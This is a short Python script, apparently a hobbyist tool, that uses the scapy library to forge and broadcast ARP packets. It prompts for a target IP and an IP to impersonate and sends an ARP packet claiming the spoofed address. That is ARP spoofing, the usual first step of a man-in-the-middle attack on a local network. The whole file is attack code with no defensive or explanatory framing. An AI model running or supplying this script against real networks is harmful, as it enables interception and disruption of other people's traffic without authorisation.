from scapy.all import ARP, Ether, sendp

def arp_spoof(target_ip, spoof_ip):
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(pdst=target_ip, psrc=spoof_ip)
    packet = ether / arp
    for x in range(1):
        sendp(packet, iface="Wi-Fi", verbose=False)
        print(f"send ARP Packet to dst {target_ip} from src {spoof_ip}")

# Example usage
target_ip=input("ENTER YOUR TARGET IP\n")
spoof_ip=input("ENTER THE SPOOFED IP\n")
arp_spoof(target_ip,spoof_ip)
